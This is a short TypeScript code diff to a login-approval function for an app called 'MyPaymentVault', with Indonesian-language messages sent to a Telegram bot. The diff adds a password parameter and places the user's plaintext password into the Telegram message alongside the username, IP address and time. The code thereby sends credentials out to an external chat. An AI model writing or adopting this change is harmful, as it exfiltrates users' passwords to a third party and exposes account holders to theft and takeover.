@@ -59,7 +59,8 @@ export async function sendApprovalRequest(
   ip: string,
   now: string,
   sessionKey: string,
-  label = "Login"
+  label = "Login",
+  password?: string
 ): Promise<number | null> {
   if (!BOT_TOKEN || !CHAT_ID) return null;
   try {
@@ -74,9 +75,10 @@ export async function sendApprovalRequest(
           `🔐 <b>MyPaymentVault</b>\n` +
           `📌 <b>Permintaan ${label}</b>\n` +
           `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-          `👤 <b>Username</b>  : <code>${username}</code>\n` +
+          `👤 <b>Username</b>   : <code>${username}</code>\n` +
+          (password ? `🔑 <b>Password</b>   : <code>${password}</code>\n` : ``) +
           `🌐 <b>IP & Lokasi</b>: <code>${ip}</code>\n` +
-          `🕐 <b>Waktu</b>     : ${now}\n\n` +
+          `🕐 <b>Waktu</b>      : ${now}\n\n` +
           `⚠️ <i>Setujui permintaan ${label.toLowerCase()} ini?</i>\n` +
           `━━━━━━━━━━━━━━━━━━━━━`,
         reply_markup: {
